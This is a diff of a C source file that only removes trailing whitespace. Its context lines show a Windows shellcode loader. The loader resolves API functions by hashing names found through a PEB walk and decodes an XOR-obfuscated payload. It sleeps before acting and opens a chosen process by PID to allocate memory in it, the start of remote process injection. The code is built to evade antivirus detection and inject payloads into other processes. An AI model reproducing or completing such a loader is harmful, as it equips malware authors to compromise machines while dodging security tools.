@@ -44,15 +44,15 @@ void* get_proc(PEB* ppeb, uint64_t func_hash)
         if (nt_header->FileHeader.Characteristics & IMAGE_FILE_DLL) {
             IMAGE_EXPORT_DIRECTORY *export_dir = (void*)((char*)ldrentry->DllBase + nt_header->OptionalHeader.DataDirectory[0].VirtualAddress);
             char * module_name = (void*)((char*)ldrentry->DllBase + export_dir->Name);
-           
+
             PDWORD funcs_name = (void*)((char*)ldrentry->DllBase + export_dir->AddressOfNames);
             PDWORD funcs_addr = (void*)((char*)ldrentry->DllBase + export_dir->AddressOfFunctions);
             PWORD ords = (void*)((char*)ldrentry->DllBase + export_dir->AddressOfNameOrdinals);
-           
+
             for (unsigned int i = 0; i < export_dir->NumberOfNames; i++) {
                 char * func_name = (void*)((char*)ldrentry->DllBase + funcs_name[i]);
                 void * func_ptr = (void*)((char*)ldrentry->DllBase + funcs_addr[ords[i]]);
-           
+
                 if (hash(module_name)+hash(func_name) == func_hash) {
                     return func_ptr;
                 }
@@ -112,7 +112,7 @@ void init_table(struct func_ptrs *fptrs)
     srand(time(NULL));
     for (int i = 0; i < 8; i++)
         x = x << 8 | ((unsigned long long)rand() & 0xff);
-   
+
     fptrs->rval = x;
 
     ppeb = get_peb();
@@ -145,7 +145,7 @@ void decode_payload(const unsigned char * payload, size_t size)
 {
     div_t q;
     unsigned char *ptr;
-    
+
     q = div(size, 2);
     ptr = (unsigned char *)payload;
 
@@ -155,16 +155,16 @@ void decode_payload(const unsigned char * payload, size_t size)
     for (int i = 0; i < q.quot; i++) {
         if (ptr[i] == ptr[(size-1)-i]) {
             ptr[i] ^= XOR_KEY;
-            ptr[(size-1)-i] ^= XOR_KEY ;    
+            ptr[(size-1)-i] ^= XOR_KEY ;
             continue;
         }
-            
+
         ptr[i] ^= ptr[(size-1)-i];
-        ptr[(size-1)-i] ^= ptr[i]; 
+        ptr[(size-1)-i] ^= ptr[i];
         ptr[i] ^= ptr[(size-1)-i];
-        
+
         ptr[i] ^= XOR_KEY;
-        ptr[(size-1)-i] ^= XOR_KEY ;    
+        ptr[(size-1)-i] ^= XOR_KEY ;
     }
 }
 
@@ -172,7 +172,7 @@ int main(int argc, char** argv)
 {
     struct func_ptrs fptrs;
     init_table(&fptrs);
-   
+
     Sleep(5000);
 
     int pid;
@@ -193,12 +193,12 @@ int main(int argc, char** argv)
         PROCESS_VM_WRITE |
         PROCESS_VM_READ, false, pid
     );
-   
+
     if (proc_handle == NULL) {
         printf("Can't open process %d\n", pid);
         return GetLastError();
     }
-   
+
     printf("proc_handle = %p", proc_handle);
 	remote_mem = FCALL(fptrs, VirtualAllocExPtr,
         	proc_handle, NULL, payload_size, MEM_COMMIT | MEM_RESERVE,
